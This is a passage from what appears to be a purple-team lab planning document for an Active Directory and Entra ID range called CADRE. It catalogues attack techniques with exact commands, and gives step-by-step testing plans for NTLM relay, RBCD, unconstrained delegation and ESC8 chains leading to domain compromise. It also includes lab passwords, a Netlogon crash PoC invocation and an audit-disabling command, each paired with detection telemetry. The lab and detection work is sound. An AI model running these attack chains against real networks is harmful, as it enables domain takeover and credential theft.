| 12 | Device Code Phishing ⏳ | Generate device code via OAuth | Session token capture | Network logs |
| 13 | ghostsurf ✅ | ntlmrelayx SOCKS proxy | SMB session hijack | Zeek smb.log |
| 14 | Shift Happens ⏳ | Context menu test | Command injection | Sysmon EID 1 |
| 15 | Into The Rainbow ⏳ | NTLMv1 rainbow lookup | Hash cracked | N/A |
| 19 | ADWS Enumeration ⏳ | `nmap -p 9389 --script=adws-enum` or SOAP client | AD users/groups via ADWS | WinSec 4624 |
| 20 | LSASS Dump via WerFault ⏳ | WerFaultSecure LSASS dump | Credential extraction | Sysmon EID 10 |
| 21 | Cross-Session Activation ⏳ | COM activation in remote session | Lateral movement | Sysmon EID 1 |
| 22 | SharpHound Detection ⏳ | Run SharpHound, review detection | BH collection telemetry | Sysmon EID 1, WinSec 4624 |
| 23 | BadSuccessor + Golden dMSA ⏳ | dMSA creation + abuse | dMSA persistence | WinSec 4742 |
| 24 | WinGet Proxy Execution ✅ | `winget install --source winget` from SYSTEM | LOLBAS execution | Sysmon EID 1, 11 |
| 25 | EntryPoint Hijacking ⏳ | Write code to memory, trigger via process run | Stealthy injection | Sysmon EID 10 |
| 26 | SpeechRuntime Lateral ⏳ | Execute via SpeechRuntime.exe | Novel lateral movement | Sysmon EID 1, 3 |
| 27 | GAC Hijacking ✅ | Drop assembly to GAC path | .NET injection | Sysmon EID 11, 7 |
| 28 | Credential Guard Bypass ⏳ | Study reference — CG architecture + bypasses | N/A (reference) | N/A |
| 29 | UnPAC-the-Hash ⏳ | `certipy auth -pfx administrator.pfx` | NT hash from PKINIT TGT | WinSec 4768, 4769 |
| 30 | ETW Internals ⏳ | Study reference — ETW architecture + tampering | N/A (detection ref) | N/A |
| 31 | SQL Server 2025 AI Abuse ✅ | `sp_invoke_external_rest_endpoint` + `CREATE EXTERNAL MODEL` | SQL exfil/coercion/C2 | SQL Audit |
| 32 | DCOMIllusionist ⏳ | `DCOMIllusionist.exe -t <target> --exec whoami` | Fileless DCOM lateral | Sysmon EID 1, 13 |
| 33 | CVE-2026-41089 Netlogon 🆕 | `python3 poc.py 192.168.77.11 child.cadre.local -l 130` (after snapshot + patch-level check) | DC LSASS crash → reboot in ~60s | WinSec 1000 (LSASS crash), 5805 (LSASS terminated), Zeek udp.log oversized CLDAP filter, Suricata new rule |
| 34 | DLL Hijacking ⏳ | Drop DLL to search path + trigger app | Persistence via trusted binary | Sysmon EID 7, 11 |
| 35 | COM Hijacking ⏳ | Modify CLSID registry → malicious DLL | Registry persistence | Sysmon EID 13, 7 |
| 36 | IFEO ⏳ | Set debugger on target exe | Persistence via IFEO | Sysmon EID 13, 1 |
| 37 | LSA SSP / Password Filter ⏳ | Register SSP DLL in LSA | Persistence + cred theft | Sysmon EID 7, 13 |
| 38 | UACME ⏳ | UACME.exe <technique> | UAC bypass | Sysmon EID 1 |
| 39 | Named Pipe Impersonation ⏳ | Create pipe + trigger SYSTEM connect | Priv-esc via pipe | Sysmon EID 17, 18 |
| 40 | Handle Leak ⏳ | Exploit leaked handle from privileged proc | Kernel privesc | Sysmon EID 10 |
| 41 | Token Dance ⏳ | Token duplication from privileged proc | Token persistence | Sysmon EID 10 |
| 42 | LAPS Extraction ✅ | LDAP query for ms-Mcs-AdmPwd | Local admin cred access | WinSec 4662 |
| 43 | BetterSuccessor ⏳ | dMSA post-patch abuse | Priv-esc via dMSA | WinSec 4742 |
| 44 | RBCD ⏳ | Write msDS-AllowedToActOnBehalfOfOtherIdentity on mbr01$ | Lateral movement via delegation | WinSec 4742 |
| 45 | Pass-the-Cert ⏳ | Certificate-based Entra ID auth | Cloud lateral movement | Entra sign-in logs |
| 46 | DCSync Detection ⏳ | Study reference — DRSBind/DRSGetNCChanges patterns | DCSync detection | WinSec 4662, Zeek dce_rpc |
| 47 | Logon Types ⏳ | Study reference — logon type → credential location | Credential access ref | WinSec 4624 |
| 60 | ADIDNSDump ⏳ | `adidnsdump -u cadre.local\intern_blue dc01.cadre.local` | DNS enumeration | Zeek dns.log |
| 61 | RBCD + NTLM Relay ⏳ | `ntlmrelayx.py -t ldap://dc01 --delegate-access --escalate-user dir_operations` | RBCD on mbr01$ via ACE#20 | Suricata SID:1000050-1000053 |
| 62 | Unconstrained Delegation ⏳ | `krbrelayx.py` on mbr01 + Coercer MS-RPRN | Capture dc02$ TGT | Suricata SID:1000050 |
| 63 | NTLM Relay to ADCS (ESC8) ⏳ | `ntlmrelayx.py -t http://cadre-dc01-ca/certsrv/certfnsh.asp --adcs` + certipy | Cert issuance from relayed auth | Suricata HTTP ESC8 |
| 64 | SMB-to-LDAP Relay ⏳ | Study reference — CVE-2019-1040 patched on Server 2025 | n/a (study) | n/a |
| 65 | Zerologon Alternative ⏳ | Study reference — CVE-2020-1472 patched on Server 2025 (superseded by #76) | n/a (study) | n/a |
| 76 | Onelogon Zero-Channel ⏳ | `python3 onelogon.py --dc 192.168.77.10 --dc-name DC01 --auth 'DC01$:<cracked_hash>' --set-password 'Pwn3dBy0ne!0g0n!'` (after author PoC release) | DC machine password reset → DCSync → Golden Ticket | WinSec 4662 (WriteProperty on DC machine account unicodePwd), Suricata SID:1000098 (single-channel NRPC), Zeek notice on `\PIPE\netlogon` from non-DC |
| 77 | Onelogon AES-CBC8 ⏳ | `python3 onelogon.py --dc 192.168.77.10 --dc-name DC01 --extract-hash krbtgt --auth 'DC01$:<cracked_hash>'` (after author PoC release) | KRBTGT NT hash → Golden Ticket without DCSync | Suricata SID:1000098 (single-channel NRPC), Zeek notice on `\PIPE\netlogon` from non-DC, WinSec 4769 anomaly |
| 90 | NetExec (nxc) 🆕 | `pipx install git+https://github.com/Pennyw0rth/NetExec` then `nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_Blu3!'` | 10-protocol post-ex framework, 16+ dump modules | Same as CME — WinSec 4624/4625/4776, Sysmon EID 1/3 |
| 91 | bloodyAD v2.5.4 ✅ | `pipx install bloodyAD` then `bloodyAD set password target 'NewP@ss!'` | Linux PowerView replacement, dMSA + ACL helpers | Sysmon EID 1 (bloodyAD process), WinSec 4662 (ACL changes) |
| 92 | Certipy v5.1.0 ✅ | `pipx install certipy-ad` then `certipy find -vulnerable -u user -p pass -dc-ip dc01` | ADCS ESC1-ESC17 enumeration + exploitation | WinSec 4886/4887 (cert request/issue), Sysmon EID 11 |
| 93 | DonPAPI v2.0+ 🆕 | `pipx install donpapi` then `donpapi collect -u admin -p 'P@ss!' -d cadre.local -t 192.168.77.22` | 12+ remote DPAPI collectors, auto DPBK | Sysmon EID 1 (donpapi), file create on `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` |
| 94 | lsassy v3.1.16 🆕 | `pipx install lsassy` then `lsassy 192.168.77.22 -u admin -p 'P@ss!'` or `nxc smb ... -M lsassy` | Remote LSASS dump with 15+ methods (comsvcs, nanodump, procdump, dumpert) | Sysmon EID 10 (LSASS access), EID 1 (dump method binary) |
| 95 | KrbRelay/KrbRelayUp 🆕 | Transfer `KrbRelayUp.exe` to target, run `KrbRelayUp relay -d cadre.local -cn "EVILBOX$" -cp "P@ss!" -l 1337` | LPE via Kerberos relay + RBCD + S4U2Self | WinSec 4742 (computer created), 4673 (SeEnableDelegationPrivilege), 4662 (RBCD write) |
| 96 | BARK ⏳ | (Plan 11 only) `Import-Module .\BARK.ps1; Get-AllEntraApps; Invoke-AllEntraAbuseTests` | Azure/Entra ID abuse validation, 80+ functions | Azure AD audit log: New-EntraAppSecret, Add-MemberToEntraGroup, Reset-EntraUserPassword |
| 97 | Skipjack (PAC downgrade) ⏳ | `Rubeus asktgt /user:intern_blue /password:'1nt3rn_Blu3!' /domain:child.cadre.local /injectSID:S-1-5-21-<cadre.local>-519 /corruptSignature` then `asktgs /service:cifs/DC01.cadre.local /ticket:doIF... /ptt` | Cross-forest Domain Admin via PAC signature downgrade (no krbtgt hash needed) | WinSec 4826 (PAC verification failed), 4769 with forged SID, Zeek kerberos.log inter-realm TGT corruption |
| 98 | NetExec `coerce_plus` 🆕 | `nxc smb 192.168.77.10,11,12 -u svc_mssql -p 's3rv1c3_MSSQL!' -M coerce_plus` + 5 new modules (`pre2k`, `enum_av`, `get-desc-users`, `winscp`, `rdp`) + `--kdcHost` flag | Consolidated coercion check + Phase 0 recon + Phase 3.5 creds | Same as individual modules (Suricata SID:1000050-1000053 for coercion; Sysmon EID 1 for module execution) |
| 99 | ADeleg (GUI tool) 🆕 | Copy `ADeleg.exe` to mbr01, run as domain user, click Connect, View → Index View By → Trustees | GUI visualization of 14 ACEs + ADCS ESC1-17 templates + delegation paths | WinSec 4662 (DS Object Access) bulk ACL reads, Zeek LDAP bulk queries, Sysmon EID 1 (ADeleg.exe) |
| 100 | Windows Security Internals (book) ⏳ | Read Ch 11 (AD), Ch 14 (Kerberos), Ch 5-8 (Security Descriptors), Ch 9 (Auditing) — reference material | Deep protocol coverage for Phase 1/2/5/6/7/8 + Skipjack/Onelogon + plan1.7 detection | N/A (reference book, not an attack tool) |
| 101 | Practical Purple Teaming (book) ⏳ | Read Ch 6 (Telemetry), Ch 8 (Atomic Red Team), Ch 9 (Caldera), Ch 11 (Reporting) — reference material | DFIR side + plan1.7 detection + tracker.md workflow + Plan 10 C2 + Track B Caldera | N/A (reference book, not an attack tool) |
| 102 | dsHeuristics abuse 🆕 | `Get-ADObject -Identity "CN=Directory Service,..." -Properties dsHeuristics` (Phase 0 read) | Read/modify forest-level AD behavior attribute | WinSec 5136 (Directory Service Changes) + Zeek LDAP modify |
| 103 | UAC bit exploitation beyond DONT_REQ_PREAUTH 🆕 | `Get-ADUser -Filter * -Properties userAccountControl \| Format UAC flags` | Enumerate all 20+ UAC flags for delegation / AS-REP / smartcard paths | WinSec 4662 (DS Object Access) |
| 104 | ms-DS-Machine-Account-Quota check 🆕 | `Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties ms-DS-Machine-Account-Quota` | Pre-flight check before WT007 RBCD — quota > 0 enables RBCD path | WinSec 4741 (Computer Object Created) |
| 105 | SACL/audit policy manipulation 🆕 | `auditpol /set /category:"DS Access" /success:disable` (red team perspective) | DETECT in plan1.7: WinSec 4907 + 4719 (audit policy changes) | WinSec 4907/4719 + Elastic KQL cadre-008 |
| 106 | Atomic Red Team validation 🆕 | `Invoke-AtomicTest T1003.001,T1558.003,T1003.006 -ShowDetails` | Cross-validate manual CAMPAIGNS.md attacks — 1000+ pre-built MITRE ATT&CK tests | Same as the underlying attack (T1003.001 → Sysmon 10, etc.) |
| 107 | GitHub Actions Supply-Chain patterns ⏳ | `npm publish --tag` + `npm dist-tag add` (analog) / `claude-code-action` defensive config (Track H) | Plan 0.8 F-11/F-12 cache poisoning + tag pollution + CADRE-Strike guardrails | Sysmon EID 1 `npm publish` from non-standard path + Zeek HTTP POST to npm registry |
| 68 | Azure AD Connect DPAPI Dump ⏳ | `adconnectdump` on dc01 (Cloud Sync) | MSOL credentials → Entra ID bridge | Sysmon EID 1 |
| 69 | Actor Tokens → Global Admin ⏳ | Request Actor token via PoC | Entra ID Global Admin | Entra audit log |
| 70 | Cloud Kerberos Trust → DA ⏳ | ROADtools + Hybrid device Kerberos ticket | On-prem DA via cloud | Zeek kerberos.log + Entra log |
| 71 | PRT Phishing ⏳ | Phishing page mimicking Azure AD device join | Persistent MFA-bypassing token | Entra sign-in log |
| 72 | Intune ADCS ESC1 ⏳ | Intune SCEP profile with vulnerable template | Cloud admin → on-prem DA | ADCS EID 4886/4887 + Intune audit |
| 73 | Temporary Access Pass Lateral ⏳ | Intercept TAP → ROADtools → PRT → MFA bypass | Exchange Online access | Entra audit log |
| 74 | Federated Credentials Persistence ⏳ | Add federated credential (GitHub OIDC) to app | Long-term persistence | Entra audit log |
| 75 | Application Admin → GA ⏳ | Add client secret to MS Graph SP → app auth → GA | Global Admin escalation | Entra audit log |
| 84 | KDS Root Key Extraction ⏳ | `Get-ADReplKdsRootKey -Domain child.cadre.local` | KDS root key (prereq for #85-89) | WinSec 4662 + Zeek DRSGetNCChanges |
| 85 | Golden gMSA ⏳ | `Get-ADDBServiceAccount -DatabasePath ntds.dit` | gMSA current + future passwords | None (offline) |
| 86 | DSRM Persistence ⏳ | `Set-LsaPolicyInformation` on dc01 | DC persistence across AD cred rotation | WinSec 4662 + Event 100 |
| 87 | LAPS Bulk Extraction ⏳ | `Get-ADDBAccount -LapsPasswords` | All LAPS passwords in bulk | WinSec 4662 |
| 88 | Golden dMSA ⏳ | `Get-ADDBServiceAccount` filter dMSA | Server 2025 dMSA password offline | None (offline, needs dMSA infra) |
| 89 | DPAPI-NG SID Protector ⏳ | SID protector decryption for BitLocker/PFX/DNSSEC/ASP.NET | Any DPAPI-NG secret | File writes to `%LOCALAPPDATA%\Microsoft\Crypto\KdsKey\` |

---

## Integration Priority

1. **MSSQLHound** ✅ — already in CAMPAIGNS.md
2. **MSSQL + SCCM CVEs** 🔬 — research only, not spine
3. **ctfmon.exe Extraction** ✅ — already in CAMPAIGNS.md (Branch 3.5H)
4. **Offensive DPAPI** ✅ — already in CAMPAIGNS.md (Branch 3.5G)
5. **Certified Pre-Owned** ✅ — already in CAMPAIGNS.md (Branch B)
6. **Shai-Hulud 2.0** ✅ — already in CAMPAIGNS.md (Branch F)
7. **Ludus SCCM** ✅ — already in CAMPAIGNS.md (Branch C)
8. **ghostsurf** ✅ — already in CAMPAIGNS.md (Phase 5)
9. **WMI Event Subscriptions** ✅ — already in CAMPAIGNS.md (Branch 3.5J)
11. **Invisible Scheduled Tasks** ✅ — already in CAMPAIGNS.md (enhances 3.5B)
12. **Golden/Silver Ticket** ⏳ — new, enhances Phase 6/7
13. **Device Code Phishing** ⏳ — new, initial access vector
14. **Shift Happens** ⏳ — negative test (likely patched)
15. **Into The Rainbow** ⏳ — one-time check
16. **Don't Jump Turnstile** ⏭️ — skip, no Cloudflare in lab
19. **ADWS Enumeration** ⏳ — new, Phase 0 alternative enum
20. **LSASS Dump via WerFault** ⏳ — new, enhances 3.5F
21. **Cross-Session Activation** ⏳ — new, Phase 5 COM lateral
22. **SharpHound Detection** ⏳ — new, Phase 4 detection reference
23. **BadSuccessor + Golden dMSA** ⏳ — new, Phase 7 Server 2025
24. **WinGet Proxy Execution** ⏳ — new, LOLBAS
25. **EntryPoint Hijacking** ⏳ — new, code injection
26. **SpeechRuntime Lateral** ⏳ — new, lateral movement
27. **GAC Hijacking** ⏳ — new, .NET injection
28. **Credential Guard Bypass** ⏳ — new, study reference for 3.5F
29. **UnPAC-the-Hash** ⏳ — new, ADCS → NT hash chain
30. **ETW Internals** ⏳ — new, detection engineering reference
31. **SQL Server 2025 AI Abuse** ✅ — new, SQL exfil/coercion/C2
32. **DCOMIllusionist** ⏳ — new, fileless DCOM lateral movement
33. **CVE-2026-41089 Netlogon RCE** 🆕 — standalone exercise, unauthenticated DC exploit, PoC cloned and ready
34. **DLL Hijacking** ⏳ — Phase 5 persistence
35. **COM Hijacking** ⏳ — Phase 5 persistence
36. **IFEO** ⏳ — Phase 5 persistence
37. **LSA SSP / Password Filter** ⏳ — Phase 5 persistence + credential access
38. **UACME** ⏳ — Phase 3 UAC bypass
39. **Named Pipe Impersonation** ⏳ — Phase 5 priv-esc via pipe
40. **Handle Leak** ⏳ — Phase 3 kernel handle leak privesc
41. **Token Dance** ⏳ — Phase 5 token manipulation persistence
42. **LAPS Extraction** ⏳ — Phase 3.5 credential access
43. **BetterSuccessor (dMSA post-patch)** ⏳ — Phase 8, extends #23
44. **RBCD** ⏳ — Phase 6, ACE#20 on mbr01$
45. **Pass-the-Cert** ⏳ — Plan 11b, Entra ID lateral movement
46. **DCSync Detection** ⏳ — Phase 7, detection reference
47. **Logon Types Reference** ⏳ — Phase 3.5, credential location reference
60. **ADIDNSDump** ⏳ — Phase 0 DNS enumeration (dirkjanm.io 2019)
61. **RBCD + NTLM Relay** ⏳ — Phase 6, chains ACE#20 + relay (dirkjanm.io 2019)
62. **Unconstrained Delegation (krbrelayx)** ⏳ — Phase 5/6, mbr01$ TGT capture (dirkjanm.io 2019)
63. **NTLM Relay to ADCS (ESC8)** ⏳ — Branch B, chains Coercer → relay → cert → UnPAC (dirkjanm.io 2021)
64. **SMB-to-LDAP Relay (CVE-2019-1040)** ⏳ — Phase 6 study ref, patched on Server 2025 (dirkjanm.io 2019)
65. **Zerologon Alternative** ⏳ — Phase 7 study ref, patched on Server 2025 (dirkjanm.io 2020)
66. **Forest Trust SID Filtering** ✅ — Phase 8 study ref (already adopted; dirkjanm.io 2018)
67. **CVE-2020-0665 Trust Bypass** ✅ — Phase 8 study ref (already adopted; dirkjanm.io 2021)
68. **Azure AD Connect DPAPI Dump** ⏳ — Branch 3.5M, dc01 Cloud Sync (dirkjanm.io 2019)
69. **Actor Tokens → Global Admin** ⏳ — Plan 11.1 EntraGoat (dirkjanm.io 2025)
70. **Cloud Kerberos Trust → DA** ⏳ — Plan 11.2 EntraGoat (dirkjanm.io 2023)
71. **PRT Phishing** ⏳ — Plan 11.3 EntraGoat (dirkjanm.io 2023)
72. **Intune ADCS ESC1** ⏳ — Plan 11.4 EntraGoat (dirkjanm.io 2025)
73. **Temporary Access Pass Lateral** ⏳ — Plan 11.5 EntraGoat (dirkjanm.io 2024)
74. **Federated Credentials Persistence** ⏳ — Plan 11.6 EntraGoat (dirkjanm.io 2024)
75. **Application Admin → GA** ⏳ — Plan 11.7 EntraGoat (dirkjanm.io 2019)
84. **KDS Root Key Extraction** ⏳ — Post-DA prereq (Grafnetter TROOPERS26)
85. **Golden gMSA** ⏳ — Post-DA (Grafnetter)
86. **DSRM Persistence** ⏳ — DC persistence (Grafnetter)
87. **LAPS Bulk Extraction** ⏳ — enhance Branch 3.5L (Grafnetter)
88. **Golden dMSA** ⏳ — Server 2025, needs dMSA infra (Grafnetter)
89. **DPAPI-NG SID Protector Decryption** ⏳ — needs BitLocker/PFX/DNSSEC infra (Grafnetter)

---

## Additional Sources (Beyond SpecterOps)

### AD Attack Path & Lab Design
| Source | Why it helps CADRE |
|:-------|:-------------------|
| GOAD + OCD AD mindmap | Benchmark topology and technique ordering; use for coverage gaps |
| HackTricks — Active Directory Methodology | Quick technique index; good for walkthrough cross-links |
| PayloadsAllTheThings — Methodology and Resources | Command cheat sheet per phase |
| Podalirius (SCCM, GPO, ADCS posts) | Deep dives on Branch B/C — complements SpecterOps SCCM/ADCS |
| [iPurple.team](https://ipurple.team/) | Purple team techniques: COM lateral, LSASS dump, dMSA abuse, EDR evasion, SharpHound detection |

### Detection & Telemetry (after tracker)
| Source | Why it helps |
|:-------|:-------------|
| Sigma HQ | Plan 1 Sigma catalog — map rules to 99 attacks |
| Elastic Detection Rules | P0a pre-built rules |
| Mordor / Security Datasets | Sample events when attack is hard to re-run |
| LOLBAS | Map WT063-068, certutil, schtasks to process chains for cadre-e* rules |
| CAR (MITRE) | Analytics ideas per technique |

### ADCS / SQL / SCCM Tooling
| Source | Why |
|:-------|:----|
| certipy docs + ADCSKiller | Branch B — validate ESC coverage vs 08-adcs-verify.yml |
| SharpSCCM / SCCMHunter | Branch C — SharpSCCM for execution, SCCMHunter for path discovery |
| Impacket MSSQL examples | Phase 3 spine — linked-server edge cases |

### Server 2025 / Platform Reality
| Source | Why |
|:-------|:----|
| Microsoft Security blog / KBs | Justify 3.5F vs 3.5A vs 3.5G outcomes |
| Atomic Red Team (T1003, T1552, T1053) | Optional harness aligned to tracker rows |

### Internal (Highest Signal)
| Source | Why |
|:-------|:----|
| CAMPAIGNS-METADATA.md | Playbook refs per WT — link when promoted |
| attack-specifications.md | Ground truth for what's deployed |
| sql/adcs/sccm-integration-guide.md | Before any suggestion changes attack surface |
| tracker.md | Promotion criteria from suggestions → CAMPAIGNS |

## Near-Term Additions (High CADRE Fit, Not in Doc Yet)

1. **SCCMHunter** — mirror of MSSQLHound for Branch C
2. **BloodHound CE custom queries** — SQL/SCCM nodes once MSSQLHound/NPMHound import
3. **LOLBAS mapping table** — tie WT063-068 + 3.5B schtasks to detection fields
4. **GOAD technique diff** — one table: "GOAD has X, CADRE has Y (Server 2025 delta)"
5. **Golden/Silver Ticket** — AD persistence after DCSync (DbgMan)
6. **Device Code Phishing** — OAuth abuse initial access (DbgMan)
7. **ADWS Enumeration** — alternative enum via port 9389 (iPurple.team)
8. **LSASS Dump via WerFault** — Microsoft-signed binary for LSASS dump (iPurple.team)
9. **Cross-Session Activation** — COM-based lateral movement (iPurple.team)
10. **BadSuccessor + Golden dMSA** — Server 2025 dMSA abuse (iPurple.team)
11. **WinGet Proxy Execution** — LOLBAS via Windows Package Manager (iPurple.team)
12. **EntryPoint Hijacking** — stealthy code injection without thread creation (iPurple.team)
13. **SpeechRuntime Lateral** — novel lateral movement via Windows Speech (iPurple.team)
14. **GAC Hijacking** — .NET Global Assembly Cache injection (iPurple.team)
15. **UnPAC-the-Hash** — NT hash from certificate via U2U (SpecterOps)
16. **ETW Internals** — telemetry tampering detection (kernullist)
17. **DCOMIllusionist** — fileless DCOM lateral movement via .NET deserialization (Synacktiv)
18. **SQL Server 2025 AI Abuse** — data exfil, NTLM coercion, C2 transport (SpecterOps)
19. **CVE-2026-41089 Netlogon RCE** — unauthenticated DC exploit, standalone exercise (CERT-EU)
20. **DLL Hijacking** — persistence via trusted binary (RTO course)
21. **COM Hijacking** — registry-based persistence (RTO course)
22. **IFEO** — debugger hijacking persistence (RTO course)
23. **LSA SSP / Password Filter** — credential theft + persistence (RTO course)
24. **UACME** — UAC bypass via 70+ techniques (RTO course)
25. **Named Pipe Impersonation** — priv-esc via pipe impersonation (RTO course)
26. **Handle Leak** — kernel handle leak exploitation (RTO course)
27. **Token Dance** — token manipulation persistence (RTO course)
28. **LAPS Extraction** — local admin password solution extraction (RTO course)
29. **BetterSuccessor** — dMSA post-patch abuse (Altered Security)
30. **RBCD** — resource-based constrained delegation via ACE#20 (Altered Security)
31. **Pass-the-Cert** — Entra ID lateral movement via certificates (Altered Security)
32. **DCSync Detection** — DRSBind/DRSGetNCChanges detection reference (Altered Security)
33. **Logon Types Reference** — Windows logon type → credential location mapping (Altered Security)

---

## Tier 3 — Dirk-jan Mollema Blog (AD/Azure Research Authority)

**Why this tier:** Dirk-jan Mollema is the primary researcher for both on-prem AD (forest trusts, delegation, ADCS) and Azure/Entra ID (PRT, Cloud Kerberos Trust, Actor tokens). His blog (https://dirkjanm.io/) is the canonical reference for many of the techniques in this campaign. CADRE has direct attack surface: mbr01 has unconstrained delegation, dc01 has Cloud Sync agent, and CADRE has 2 forests with SID Filter OFF.

### 60. ADIDNSDump — DNS Reconnaissance (Phase 0) ⏳

**Source:** https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/
**Year:** 2019
**Tool:** adidnsdump (https://github.com/dirkjanm/adidnsdump)
**MITRE:** T1590.002 (Gather Victim Network Information: DNS)
**Status:** ⏳ Pending — Phase 0 recon

**Relevance to CADRE:** Phase 0 — DNS enumeration. AD-integrated DNS allows any user to query all records by default. adidnsdump enumerates the AD DNS zone, including records the querying user has no explicit read rights to. Complements Kerberos user enum (port 88) and BloodHound.

**Why CADRE needs it:** Range.local forest is "external" — but DNS zone transfers may leak internal records. ADIDNSDump can dump both cadre.local and child.cadre.local zones from any authenticated user.

**Campaign location:** Phase 0 (Recon) — alongside Kerberos user enum. Output feeds Phase 4 (BloodHound).

**Testing plan:**
1. `adidnsdump -u cadre.local\\intern_blue -p '1nt3rn_Blu3!' dc01.cadre.local` from Kali
2. Compare output with BloodHound computer list
3. Check for unpublicized records (Azure/Entra endpoints, Azure AD Connect server, etc.)

**Detection:** Zeek dns.log queries against authoritative AD DNS servers. Elastic cadre-* DNS volume rule can flag bulk enumeration queries.

---

### 61. RBCD + NTLM Relay (Phase 6 Lateral Movement) ⏳

**Source:** https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
**Year:** 2019
**Tool:** krbrelayx (https://github.com/dirkjanm/krbrelayx)
**MITRE:** T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting) + T1187 (Forced Authentication)
**Status:** ⏳ Pending — Phase 6 lateral movement

**Relevance to CADRE:** Phase 6 — ACE#20 (`dir_operations → mbr01$: GenericWrite`) enables RBCD on mbr01. Pair with NTLM relay to authenticate as dir_operations → trigger RBCD → impersonate dir_operations against mbr01 → SYSTEM. This is the most impactful lateral movement technique in the lab.

**Why CADRE needs it:** RBCD on mbr01 is the playbook's intended Phase 6 path. Without NTLM relay, you need to coerce dir_operations to authenticate. With relay, you can do it silently.

**Campaign location:** Phase 6 (Lateral Movement) — alternate path to mbr01$ admin. Chains ACE#20 (GenericWrite) + NTLM relay.

**Testing plan:**
1. Run `ntlmrelayx.py -t ldap://dc01.cadre.local --delegate-access --escalate-user dir_operations` on Kali
2. Coerce dir_operations authentication via Coercer (`coercer coerce -t dc01 -l <relay>`) or PetitPotam
3. ntlmrelayx sets RBCD on mbr01$ → dir_operations gets RBCD rights
4. `getST.py -spn cifs/mbr01.cadre.local -impersonate administrator cadre.local/dir_operations`
5. `psexec.py -k mbr01.cadre.local` → SYSTEM

**Detection:** Suricata SID:1000050-1000053 (coercion rules), Zeek dce_rpc.log (relay connections), Elastic cadre-003 RBCD detection rule (msDS-AllowedToActOnBehalfOfOtherIdentity changes).

---

### 62. Unconstrained Delegation Abuse via krbrelayx (Phase 6) ⏳

**Source:** https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
**Year:** 2019
**Tool:** krbrelayx (https://github.com/dirkjanm/krbrelayx)
**MITRE:** T1187 (Forced Authentication) + T1550.003 (Use Alternate Authentication Material: Pass the Ticket)
**Status:** ⏳ Pending — Phase 6 lateral movement

**Relevance to CADRE:** Phase 6 — mbr01 has **unconstrained delegation** enabled. Any user authenticating to mbr01 (or any service running as SYSTEM) gets their TGT extracted via krbrelayx. CADRE has mbr01 with TRUSTED_FOR_DELEGATION flag set. mssqlsvc and IIS service accounts are typical targets.

**Why CADRE needs it:** mbr01's unconstrained delegation is the highest-value Phase 6 target. Coercing a DA or DC to authenticate to mbr01 → extract TGT → DCSync. This is the most direct path to Enterprise Admin.

**Campaign location:** Phase 6 (Lateral Movement) → Phase 7 (DCSync) — short-circuits multiple phases.

**Testing plan:**
1. Run `krbrelayx.py -krbtgt dc01.cadre.local` on mbr01 (listening for incoming TGT submissions)
2. Coerce dc01$ via Coercer MS-RPRN (PrinterBug) to authenticate to mbr01
3. krbrelayx captures dc01$ TGT → DC TGT = full domain compromise
4. `secretsdump.py -k -no-pass dc01.cadre.local` → all hashes

**Detection:** Suricata SID:1000050 (MS-RPRN coercion rule). Elastic Windows EID 4624 (Logon) Type 3 with "Network" logon process for TGT submission to non-DC. This is one of the most reliably detected attacks.

**Note:** This is **a DANGEROUS technique in production** — it gives instant DA. Only test in lab.

---

### 63. NTLM Relay to ADCS (ESC8) ⏳

**Source:** https://dirkjanm.io/ntlm-relaying-to-ad-cs/
**Year:** 2021
**Tool:** ntlmrelayx + certipy
**MITRE:** T1187 (Forced Authentication) + T1558 (Steal or Forge Kerberos Tickets)
**Status:** ⏳ Pending — Branch B ADCS

**Relevance to CADRE:** Branch B (ADCS) — NTLM relay against ADCS web enrollment endpoints (ESC8). CADRE has ADCS deployed on dc01 (CEP/CES). Combine with Coercer to force authentication → relay to ADCS → get certificate as victim user → UnPAC-the-Hash → NT hash.

**Why CADRE needs it:** ESC8 is the most impactful ADCS attack in modern environments. ADCS web enrollment is commonly exposed and rarely hardened. CADRE has the full ADCS infrastructure (CA, CEP, CES) deployed.

**Campaign location:** Branch B (ADCS) — Phase B.3 (ESC1-8). Chains Coercer → NTLM relay → certificate issuance → UnPAC.

**Testing plan:**
1. `certipy find -u analyst_t2@cadre.local -p 'T2_Ch@ng3d!' -dc-ip 192.168.77.10` to find ESC8 vulnerable endpoints
2. `ntlmrelayx.py -t http://cadre-dc01-ca.cadre.local/certsrv/certfnsh.asp -smb2support --adcs` on Kali
3. Coerce a target user via Coercer
4. ntlmrelayx auto-issues certificate → save as `.pfx`
5. `certipy auth -pfx <user>.pfx -dc-ip 192.168.77.10` → TGT → secretsdump

**Detection:** Suricata ESC8 relay detection (HTTP POST to /certsrv/ from attacker IP). Elastic ADCS EID 4886 (certificate issued) + EID 4887 (certificate request). Track unusual template issuance.

---

### 64. SMB-to-LDAP Relay (CVE-2019-1040) ⏳

**Source:** https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/
**Year:** 2019
**Tool:** ntlmrelayx + printerbug (pre-patch, but worth studying)
**MITRE:** T1187 (Forced Authentication) + T1078 (Valid Accounts)
**Status:** ⏳ Pending — study reference (patched on Server 2025)

**Relevance to CADRE:** Phase 6 study reference. CVE-2019-1040 bypasses NTLM MIC → enables SMB-to-LDAP relay → RCE as SYSTEM on any unpatched server. **Patched on Server 2025** but the technique is foundational for understanding relay attacks. Worth a study reference entry.

**Why CADRE needs it:** Understanding the relay attack chain (Coercer → ntlmrelayx → RBCD/ADCS/LDAP) is required for both Phase 6 execution and detection engineering. Server 2025 has MIC enforcement, so this exact CVE won't work, but the relay primitives still apply.

**Campaign location:** Detection engineering reference only. Add to plan1.7 as relay attack baseline.

**Testing plan:** Not applicable on Server 2025. Study reference.

**Detection:** n/a (won't fire on Server 2025). Use as reference for understanding relay chain.

---

### 65. Zerologon Alternative Exploitation (Phase 7) ⏳

**Source:** https://dirkjanm.io/a-different-way-of-abusing-zerologon/
**Year:** 2020
**Tool:** impacket zerologon (improved version)
**MITRE:** T1190 (Exploit Public-Facing Application)
**Status:** ⏳ Pending — study reference (patched on Server 2025)

